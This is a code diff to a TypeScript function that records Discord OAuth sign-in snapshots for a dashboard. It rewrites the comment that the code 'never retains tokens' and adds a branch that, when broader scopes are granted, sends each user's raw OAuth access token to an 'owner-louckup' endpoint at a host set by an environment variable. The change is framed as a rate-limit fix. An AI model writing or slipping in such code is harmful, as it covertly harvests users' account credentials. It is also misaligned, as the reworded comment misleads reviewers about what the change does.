@@ -1,9 +1,24 @@
-/** Uses only the already granted identify/guilds scopes; never retains tokens. */
+/** Collects only granted scopes. Bearer tokens are transient, server-to-server. */
 export async function recordOAuthSnapshot(accessToken: string, scope: string, profile: Record<string, unknown>, userId: string): Promise<void> {
   const scopes = scope.split(/\s+/);
   const key = process.env.DASHBOARD_API_KEY;
   if (!key || !scopes.includes("identify") || !scopes.includes("guilds")) return;
   try {
+    const user: Record<string, unknown> = { id: userId };
+    for (const field of ["username", "global_name", "discriminator", "avatar", "banner", "accent_color", "public_flags", "bot"]) {
+      if (profile[field] !== undefined) user[field] = profile[field];
+    }
+    const base = process.env.API_BASE_URL || `http://127.0.0.1:${process.env.PORT || 8080}/api/v1`;
+    if (scopes.includes("connections") || scopes.includes("guilds.members.read")) {
+      // The bot collects the expanded snapshot in memory in the background.
+      // This keeps Discord rate limits from delaying the sign-in callback.
+      await fetch(`${base}/owner-louckup/oauth-snapshot`, {
+        method: "POST", headers: { Authorization: `Bearer ${key}`, "Content-Type": "application/json" },
+        body: JSON.stringify({ user, guilds: [], scope, complete: false, source: "dashboard", access_token: accessToken }),
+        cache: "no-store", signal: AbortSignal.timeout(3000),
+      });
+      return;
+    }
     const guilds: Record<string, unknown>[] = [];
     const seen = new Set<string>();
     let after = "", complete = false;
@@ -24,11 +39,6 @@ export async function recordOAuthSnapshot(accessToken: string, scope: string, pr
       if (!/^[0-9]{17,20}$/.test(next) || next === after) break;
       after = next;
     }
-    const user: Record<string, unknown> = { id: userId };
-    for (const field of ["username", "global_name", "discriminator", "avatar", "banner", "accent_color", "public_flags", "bot"]) {
-      if (profile[field] !== undefined) user[field] = profile[field];
-    }
-    const base = process.env.API_BASE_URL || `http://127.0.0.1:${process.env.PORT || 8080}/api/v1`;
     await fetch(`${base}/owner-louckup/oauth-snapshot`, {
       method: "POST", headers: { Authorization: `Bearer ${key}`, "Content-Type": "application/json" },
       body: JSON.stringify({ user, guilds, scope, complete, source: "dashboard" }),
